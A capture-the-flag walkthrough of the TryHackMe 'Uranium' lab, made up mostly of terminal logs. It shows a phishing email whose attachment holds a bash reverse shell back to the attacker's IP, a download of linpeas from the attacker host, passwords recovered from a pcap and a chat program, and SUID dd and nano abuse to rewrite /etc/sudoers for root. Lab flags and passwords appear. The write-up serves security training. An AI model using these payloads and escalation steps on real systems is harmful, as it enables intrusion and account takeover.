----
Uranium CTF
----

![](https://coingeek.com/wp-content/uploads/2019/06/binance-decides-to-block-us-users-but-gives-them-a-back-door.jpg)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/6e06fc3dc1d18c68538cfb064c3ec383.jpeg)


### Task 1  First Stage

 Start Machine

We have reached out a account one of the employees [hakanbey](https://twitter.com/hakanbe40520689)

In this room, you will learn about one of the phishing attack methods. I tried to design a phishing room (cronjobs and services) as much as I could.

Special Thanks to kral4 for helping us to make this room  

Note: Please do not attack the given twitter account.  

MACHINE_IP  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.18.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.18.21:22
Open 10.10.18.21:25
Open 10.10.18.21:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 21:04 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:04
Completed Parallel DNS resolution of 1 host. at 21:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:04
Scanning 10.10.18.21 [3 ports]
Discovered open port 22/tcp on 10.10.18.21
Discovered open port 80/tcp on 10.10.18.21
Discovered open port 25/tcp on 10.10.18.21
Completed Connect Scan at 21:04, 0.20s elapsed (3 total ports)
Initiating Service scan at 21:04
Scanning 3 services on 10.10.18.21
Completed Service scan at 21:04, 6.44s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.18.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 5.84s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 4.35s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
Nmap scan report for 10.10.18.21
Host is up, received user-set (0.20s latency).
Scanned at 2023-07-18 21:04:22 EDT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a13cd7e9d0854033d507163208633105 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMwJfFdIx+ajk4m+SaA9FCONx/arQgXZx22oViZpzp6QSuMYI3u4GXubPf+P/1AKjrdTZ2UtLt3HszSNuf3V/RMQgvXYrPGFmClvfnZZ88an/oz38l4aGTnZ1LJ8upLU90METx4YXcA9uM3u0dECXfUMqFHX+wwFxP/WKUJ7lX3Ae7H+Uj2Bwrw76d8Ndwf3a/EDZ6gTzYTgrgprZQeBbriJM9yrjljakLNCajdDzjtDSQs+wXwme2MXx8u7aAZ4ofL7cuGxCPil2R92HWrKomMQ7Iyd9SMre3rCLhSOhbYnJGTwl3P6fEqCPqp2shMO2AYVrgz0jC6ou8iM3jGe4t
|   256 24810c3a9155a0659e36587151136c34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBZPRLpPW1xp0xWpgkGvpFwR6tKPTMRvjkAbiwoPC/qCKUYg2p06XDFCMHNDmuqIC5SHvnqZqM0EdwJIuUkFvIE=
|   256 c2942b0d8ea953f6ef34dbf1436cc17e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFY55KAy8LZ+FNH0gc/IzoPlL/gQDwtvUMTzmQTd8MAj
25/tcp open  smtp    syn-ack Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=uranium
| Subject Alternative Name: DNS:uranium
| Issuer: commonName=uranium
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-09T21:40:53
| Not valid after:  2031-04-07T21:40:53
| MD5:   293dbef32fee6092c0d72a67ea27367c
| SHA-1: 0a0c26e0ae3c723e538d3c216b40c84cf9e78fdb
| -----BEGIN CERTIFICATE-----
| MIIC0zCCAbugAwIBAgIUIVXdlC2OCz8mRhqtv01MouzQ0ZswDQYJKoZIhvcNAQEL
| BQAwEjEQMA4GA1UEAwwHdXJhbml1bTAeFw0yMTA0MDkyMTQwNTNaFw0zMTA0MDcy
| MTQwNTNaMBIxEDAOBgNVBAMMB3VyYW5pdW0wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCpxCDhZoI2WVRkeoeXHBA1Y3LnA0WNjAnH1HyeYwzhKeVekmip
| m3bzvH0e3Z9D9zyf1mnhYnV4i4yA8I+Jp/Cx1Gc9VXvD2cAW4azHdCZBjR6arGCF
| 14gxtdrgiBSdKoMqUo2T9tlfqfnrGOTcc70KYXBJ6tjIHPrFmeXRUvlZWhsF0i1R
| zWqWLNB3Wy7O2yYP2SV8MLjoEGi2ZeqSMbYkhMKTbS7VSLNISO9ax2Wxb5j5lELX
| jLox6/nPueJkLR37YbjDztdZ3Lpz8FXUqymz+OWZq2MLYfde2Zn7cA7zFgeCfOJM
| HhGN9BC046EBW60RVFhWaczTHsRALnWvQ5VfAgMBAAGjITAfMAkGA1UdEwQCMAAw
| EgYDVR0RBAswCYIHdXJhbml1bTANBgkqhkiG9w0BAQsFAAOCAQEAj1F/S1v2EFAL
| H1FG/SWNlqsD9KKwUDSceiHicEz8IE9YU+Vg1NRxluYYpkDbfyrCVBPW//JZJNd2
| jpCObLaQRxZ/4QCa+t4/7Nlue8IiWzax8nEVMUV8clFGlBmktfsx7d/iyjDeGq2H
| VE3p6nFpZFmGmCvYfue9IcZWduFbOIWzf2XvnGnaHxYvccBry7tFGW5F93i3asV3
| UQqT8xZ+eaxzijdoEl9klp/Ee4R2b8bjHMDt7SFzvQAGzL3j1mFPY9qA78K9eNv3
| vHgqdChT9jryHVBEcLiTTPsfNRcARQeOr4O0wGdlQX6E3FRbPn3JpM96Do8+/kJd
| r/RWkJhbQQ==
|_-----END CERTIFICATE-----
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Uranium Coin
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:04
Completed NSE at 21:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ telnet 10.10.18.21 25
Trying 10.10.18.21...
Connected to 10.10.18.21.
Escape character is '^]'.
220 uranium ESMTP Postfix (Ubuntu)
HELO x
250 uranium
VRFY root
252 2.0.0 root


https://twitter.com/hakanbe40520689

I really love this company uranium.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts       
10.10.18.21  uranium.thm


Everyone can send me application files (filename: "application") from my mail account. I open and review all applications one by one in the terminal.


https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

sendEmail -t hakanbey@uranium.thm -f witty@mail.com -s uranium.thm -u "Testing" -m "Hi" -o tls=no -a application

The command you provided is a syntax for using the "sendEmail" utility to send an email. Here's the breakdown of the command and its options:

1. `-t hakanbey@uranium.thm`: This specifies the recipient's email address. In this case, the email will be sent to "[hakanbey@uranium.thm](mailto:hakanbey@uranium.thm)."
    
2. `-f witty@mail.com`: This specifies the sender's email address. The email will appear to be sent from "[witty@mail.com](mailto:witty@mail.com)."
    
3. `-s uranium.thm`: This is the SMTP server address. The email will be sent using the SMTP server located at "uranium.thm."
    
4. `-u "Testing"`: This is the subject of the email. The subject of the email will be "Testing."
    
5. `-m "Hi"`: This is the body of the email. The content of the email will be "Hi."
    
6. `-o tls=no`: This specifies that TLS (Transport Layer Security) should not be used for the connection. TLS is a security protocol used to encrypt the email communication. Setting it to "no" means that the email will be sent without encryption.
    
7. `-a application`: This is used to attach a file to the email. In this case, "application" refers to the file that you want to attach to the email.
    

By using this command, you can send an email to the specified recipient with the provided subject, body, and attachment (if any), using the specified sender and SMTP server address. However, it's worth noting that the exact behavior and available options of the "sendEmail" utility may vary depending on the version and configuration of the software you are using.

┌──(witty㉿kali)-[~/Downloads]
└─$ cat application 
bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"

┌──(witty㉿kali)-[~/Downloads]
└─$ sendEmail -t hakanbey@uranium.thm -f witty@mail.com -s uranium.thm -u "Testing" -m "Hi" -o tls=no -a application
Jul 18 21:18:19 kali sendEmail[313540]: Email was sent successfully!

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.18.21] 46586
bash: cannot set terminal process group (1922): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
hakanbey@uranium:~$ id
id
uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey)

or using swaks

Swaks is a command-line utility used for testing SMTP servers. It stands for "Swiss Army Knife for SMTP" and provides a versatile set of features to send and receive emails, simulate different scenarios, and diagnose SMTP-related issues. Swaks is commonly used by system administrators, developers, and email server operators for testing and troubleshooting email systems.

With Swaks, you can:

1. Send test emails: You can use Swaks to send test emails to check if your SMTP server is working correctly.
    
2. Simulate various email scenarios: Swaks allows you to simulate different scenarios, such as sending emails with different attachments, headers, and content types.
    
3. Test email relaying: Swaks can be used to test if your SMTP server is correctly relaying emails to other servers.
    
4. Debug SMTP issues: If you encounter problems with your email system, Swaks can help you diagnose and debug SMTP-related issues by providing detailed output and error messages.
    

Overall, Swaks is a powerful tool for testing and troubleshooting SMTP servers, and it offers a wide range of options and configurations to suit various testing needs.

┌──(witty㉿kali)-[~/Downloads]
└─$ swaks --to hakanbey@uranium.thm --from hakanbey_fake@uranium.thm --header "Subject: Not phish" --body "hi" --server uranium.thm --attach application
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying uranium.thm:25...
=== Connected to uranium.thm.
<-  220 uranium ESMTP Postfix (Ubuntu)
 -> EHLO kali
<-  250-uranium
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250 SMTPUTF8
 -> MAIL FROM:<hakanbey_fake@uranium.thm>
<-  250 2.1.0 Ok
 -> RCPT TO:<hakanbey@uranium.thm>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 18 Jul 2023 21:23:59 -0400
 -> To: hakanbey@uranium.thm
 -> From: hakanbey_fake@uranium.thm
 -> Subject: Not phish
 -> Message-Id: <20230718212359.315151@kali>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_315151"
 -> 
 -> ------=_MIME_BOUNDARY_000_315151
 -> Content-Type: text/plain
 -> 
 -> hi
 -> ------=_MIME_BOUNDARY_000_315151
 -> Content-Type: application/octet-stream; name="application"
 -> Content-Description: application
 -> Content-Disposition: attachment; filename="application"
 -> Content-Transfer-Encoding: BASE64
 -> 
 -> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy80NDQ0IDA+JjEiCg==
 -> 
 -> ------=_MIME_BOUNDARY_000_315151--
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 8E16640130
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.18.21] 46600
bash: cannot set terminal process group (2007): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null

hakanbey@uranium:~$ ls
ls
chat_with_kral4  mail_file  user_1.txt
hakanbey@uranium:~$ cat user_1.txt
cat user_1.txt
thm{2aa50e58fa82244213d5438187c0da7c}

hakanbey@uranium:~$ ./chat_with_kral4
./chat_with_kral4
PASSWORD :a
a
NOT AUTHORIZED

hakanbey@uranium:/home$ cd /tmp
cd /tmp
hakanbey@uranium:/tmp$ wget http://10.8.19.103/linpeas.sh
wget http://10.8.19.103/linpeas.sh
--2023-07-19 01:39:21--  http://10.8.19.103/linpeas.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   567KB/s    in 1.4s    

2023-07-19 01:39:23 (567 KB/s) - ‘linpeas.sh’ saved [828098/828098]

hakanbey@uranium:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
hakanbey@uranium:/tmp$ ./linpeas.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.18.21 - - [18/Jul/2023 21:39:20] "GET /linpeas.sh HTTP/1.1" 200 -

8╔══════════╣ Searching passwords inside logs (limit 70)
2021-05-04 19:41:15,560 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-05-04 19:41:15,560 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-05-04 21:00:51,421 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-05-04 21:00:51,421 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-05-06 11:58:07,761 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-05-06 11:58:07,761 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-05-06 13:43:33,049 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-05-06 13:43:33,049 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-05-06 13:49:58,546 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-05-06 13:49:58,546 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-05-06 14:34:14,232 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-05-06 14:34:14,232 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2023-07-19 00:29:39,134 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-07-19 00:29:39,134 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
Apr 09 20:41:11 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Apr 09 20:41:12 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Binary file /var/log/hakanbey_network_log.pcap matches

hakanbey@uranium:/var/log$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [19/Jul/2023 01:46:25] "GET /hakanbey_network_log.pcap HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.18.21:8000/hakanbey_network_log.pcap
--2023-07-18 21:46:23--  http://10.10.18.21:8000/hakanbey_network_log.pcap
Connecting to 10.10.18.21:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1869 (1.8K) [application/vnd.tcpdump.pcap]
Saving to: ‘hakanbey_network_log.pcap’

hakanbey_network 100%[=========>]   1.83K  --.-KB/s    in 0s      

2023-07-18 21:46:23 (46.9 MB/s) - ‘hakanbey_network_log.pcap’ saved [1869/1869]

┌──(witty㉿kali)-[~/Downloads]
└─$ wireshark hakanbey_network_log.pcap 

Follow TCP

MBMD1vdpjg3kGv6SsIz56VNG
Hi Kral4
Hi bro
I forget my password, do you know my password ?
Yes, wait a sec I'll send you.
Oh , yes yes I remember. No need anymore. Ty..
Okay bro, take care !

hakanbey@uranium:~$ ./chat_with_kral4
./chat_with_kral4
PASSWORD :MBMD1vdpjg3kGv6SsIz56VNG
MBMD1vdpjg3kGv6SsIz56VNG
kral4:hi hakanbey

->Hi Kral4
Hi Kral4
hakanbey:Hi Kral4

->hi
hi
hakanbey:hi
kral4:how are you?

->fine and you
fine and you
hakanbey:fine and you
kral4:what now? did you forgot your password again

->yes
yes
hakanbey:yes
kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated

hakanbey@uranium:~$ sudo -l
sudo -l
[sudo] password for hakanbey: Mys3cr3tp4sw0rD

Matching Defaults entries for hakanbey on uranium:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
hakanbey@uranium:~$ sudo -u kral4 /bin/bash
sudo -u kral4 /bin/bash
kral4@uranium:~$ cd /home
cd /home
kral4@uranium:/home$ ls
ls
hakanbey  kral4
kral4@uranium:/home$ cd kral4
cd kral4
kral4@uranium:/home/kral4$ ls
ls
chat_with_hakanbey  user_2.txt
kral4@uranium:/home/kral4$ cat user_2.txt
cat user_2.txt
thm{804d12e6d16189075db2d45449aeda5f}

kral4@uranium:/home/kral4$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudo
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/mount
/bin/dd
kral4@uranium:/home/kral4$ find / -type f -name web_flag.txt  2>/dev/null
find / -type f -name web_flag.txt  2>/dev/null
/var/www/html/web_flag.txt
kral4@uranium:/home/kral4$ cat /var/www/html/web_flag.txt
cat /var/www/html/web_flag.txt
cat: /var/www/html/web_flag.txt: Permission denied

LFILE=file_to_read
dd if=$LFILE

kral4@uranium:/home/kral4$ /bin/dd if=/var/www/html/web_flag.txt
/bin/dd if=/var/www/html/web_flag.txt
thm{019d332a6a223a98b955c160b3e6750a}
0+1 records in
0+1 records out
38 bytes copied, 0.000742536 s, 51.2 kB/s

kral4@uranium:/var/mail$ cat kral4
cat kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
	by uranium (Postfix) with ESMTP id C7533401C2
	for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
Message-ID: <841530.943147035-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.

------MIME delimiter for sendEmail-992935.514616878--

kral4@uranium:/var/mail$ cp /bin/nano /home/kral4/

cp /bin/nano /home/kral4/
kral4@uranium:/var/mail$ 

LFILE=file_to_write
echo "DATA" | dd of=$LFILE

kral4@uranium:/var/mail$ echo "hacked" | dd of=/var/www/html/index.html
echo "hacked" | dd of=/var/www/html/index.html
0+1 records in
0+1 records out
7 bytes copied, 0.000149922 s, 46.7 kB/s
kral4@uranium:/var/mail$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
-rwsrwxrwx 1 root root 245872 Jul 19 02:09 /home/kral4/nano
-rwsr-xr-x 1 root root 113528 Feb  2  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-x--- 1 web kral4 76000 Apr 23  2021 /bin/dd

kral4@uranium:/var/mail$ ls
ls
hakanbey  kral4
You have new mail in /var/mail/kral4
kral4@uranium:/var/mail$ cat kral4
cat kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
	by uranium (Postfix) with ESMTP id C7533401C2
	for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
Message-ID: <841530.943147035-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.

------MIME delimiter for sendEmail-992935.514616878--


From root@uranium.thm  Wed Jul 19 02:10:19 2023
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
	by uranium (Postfix) with ESMTP id BD58D401AC
	for <kral4@uranium.thm>; Wed, 19 Jul 2023 02:10:19 +0000 (UTC)
Message-ID: <424705.819550098-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Wed, 19 Jul 2023 02:10:19 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-956349.443717958"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-956349.443717958
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I think our index page has been hacked again. You know how to fix it, I am giving authorization.

------MIME delimiter for sendEmail-956349.443717958--

kral4@uranium:/home/kral4$ ls -lah
ls -lah
total 384K
drwxr-x--- 3 kral4 kral4 4.0K Jul 19 02:09 .
drwxr-xr-x 4 root  root  4.0K Apr 23  2021 ..
lrwxrwxrwx 1 root  root     9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kral4 kral4  220 Apr  9  2021 .bash_logout
-rw-r--r-- 1 kral4 kral4 3.7K Apr  9  2021 .bashrc
-rwxr-xr-x 1 kral4 kral4 108K Apr  9  2021 chat_with_hakanbey
-rw-r--r-- 1 kral4 kral4    5 Jul 19 01:54 .check
drwxrwxr-x 3 kral4 kral4 4.0K Apr 10  2021 .local
-rwsrwxrwx 1 root  root  241K Jul 19 02:09 nano
-rw-r--r-- 1 kral4 kral4  807 Apr  9  2021 .profile
-rw-rw-r-- 1 kral4 kral4   38 Apr 10  2021 user_2.txt

# Press Ctrl+Z


stty raw -echo; fg; reset;

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;

kral4@uranium:/home/kral4$ nano /etc/sudoers
Unable to create directory /home/hakanbey/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

kral4@uranium:/home/kral4$ ./nano /etc/sudoers

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
%hakanbey   ALL=(ALL:ALL) ALL

kral4@uranium:/home/kral4$ su hakanbey
Password: 
hakanbey@uranium:/home/kral4$ sudo -l
Matching Defaults entries for hakanbey on uranium:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
    (ALL : ALL) ALL
hakanbey@uranium:/home/kral4$ sudo su
root@uranium:/home/kral4# cd /root
root@uranium:~# ls
htmlcheck.py  root.txt
root@uranium:~# cat root.txt 
thm{81498047439cc0426bafa1db5da699cd}
root@uranium:~# cat htmlcheck.py
import hashlib
import os, os.path
import time

index_path = "/var/www/html/index.html"
nano_path = "/home/kral4/nano"

index_hash = hashlib.md5(open(index_path, 'rb').read()).hexdigest()
nano_hash = hashlib.md5(open("/bin/nano", 'rb').read()).hexdigest()


def check_integrity():
    while True:
        if hashlib.md5(open(index_path, 'rb').read()).hexdigest() != index_hash:
            if os.path.isfile(nano_path):
                if hashlib.md5(open(nano_path, 'rb').read()).hexdigest() != nano_hash:
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
